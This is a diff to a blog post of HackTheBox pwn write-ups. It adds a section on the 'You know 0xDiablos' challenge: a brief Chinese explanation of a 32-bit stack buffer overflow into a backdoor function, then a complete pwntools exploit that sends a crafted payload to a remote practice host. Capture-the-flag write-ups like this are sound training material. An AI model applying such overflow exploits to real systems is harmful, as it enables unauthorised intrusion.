@@ -1,7 +1,7 @@
 ---
 title: "Write-ups: HackTheBox"
 published: 2025-07-24
-updated: 2025-07-29
+updated: 2025-07-31
 description: "Write-ups for HackTheBox's pwn challenges."
 image: "https://jsd.cdn.zzko.cn/gh/CuB3y0nd/picx-images-hosting@master/.2rvfoyyezu.avif"
 tags: ["Pwn", "Write-ups"]
@@ -392,6 +392,71 @@ def main():
 
     payload = flat(b"A" * 0x28, one_gadget)
     target.sendafter(b"> ", payload)
+
+    target.interactive()
+
+
+if __name__ == "__main__":
+    main()
+```
+
+# You know 0xDiablos
+
+## Difficulty
+
+- EASY
+
+## Description
+
+> I missed my flag
+
+## Write-up
+
+BOF，后门函数 `flag`，检测两个参数。32-bit 栈传参，没啥好说的，不过 python 整数是无限精度的，给它 -1 它就认为这是数学上的 -1，所以我们必须通过把数字截断为 32-bit 补码的形式来模拟 C 在内存中的数据表示。
+
+## Exploit
+
+```python
+#!/usr/bin/env python3
+
+from pwn import (
+    args,
+    context,
+    fit,
+    process,
+    raw_input,
+    remote,
+)
+
+FILE = "./vuln"
+HOST, PORT = "94.237.57.115", 42156
+
+context(log_level="debug", binary=FILE, terminal="kitty")
+
+elf = context.binary
+
+
+def launch():
+    if args.L:
+        target = process(FILE)
+    else:
+        target = remote(HOST, PORT)
+    return target
+
+
+def main():
+    target = launch()
+
+    payload = fit(
+        {
+            0xBC: elf.sym["flag"],
+            0xC0: elf.sym["exit"],
+            0xC4: -559038737 & 0xFFFFFFFF,
+            0xC8: -1059139571 & 0xFFFFFFFF,
+        }
+    )
+    # raw_input("DEBUG")
+    target.sendlineafter(b": ", payload)
 
     target.interactive()
 
